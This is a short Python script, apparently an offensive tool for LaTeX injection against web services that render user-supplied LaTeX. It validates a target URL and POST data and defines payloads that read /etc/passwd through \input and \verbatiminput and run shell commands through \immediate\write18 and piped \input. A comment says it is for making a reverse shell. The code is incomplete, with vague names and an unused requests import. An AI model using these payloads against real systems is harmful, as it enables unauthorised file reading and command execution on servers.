#coding:utf-8

import sys
import requests
import urllib

from optparse import *
from modules import options

# This project allows to test latex vulnerability to have good thing.
# And to make a reverse shell for example.

class LatexIncorrectSerial(Exception):
	def __init__(self, LatexSerial=None):
		'''
		I create a specific function
		for an exception for a reason.
		'''
		pass

class LatexArgumentation:
	def __init__(self, LatexOptionnal=None,
							PayloadMeasure=None,
							MeasurePayload=None):
		'''
			Creating arguments to
			do something cool.
		'''
		self.URL = options.ArgumentURL
		self.POST = options.ArgumentPOST

		self.Optionnal = LatexOptionnal
		self.LowPayload = PayloadMeasure
		self.SpeedPayload = MeasurePayload

	def StringLT(self):
		'''
			The attack takes place
			at this precise function.
		'''
		if(self.URL.startswith(("http://", "https://")) == False):
			raise LatexIncorrectSerial("URL crashed !")

		for StringsPT in ["=", "&"]:
			if not(StringsPT in self.POST):
				raise LatexIncorrectSerial("Post-Data crashed !")

	def StringNT(self):
		'''
			The attack takes place
			here with several success.	
		'''
		self.Optionnal = {
			"Reading.Measure": {
				"\input{/etc/passwd}":False,
				"\usepackage{verbatim}":False,
				"\+verbatiminput{/etc/passwd}":False

			}, "Execution.Measure": {
				"\immediate\write18{cat /etc/passwd}":False,
				"\input|cat /etc/passwd":False,
				"\input{|'cat /etc/passwd'}":False
			}

		}

		self.LowPayload = self.Optionnal["Reading.Measure"].keys()
		self.SpeedPayload = self.Optionnal["Execution.Measure"].keys()

if __name__ == "__main__":
	Argument = LatexArgumentation()
	Argument.StringLT()
	Argument.StringNT()
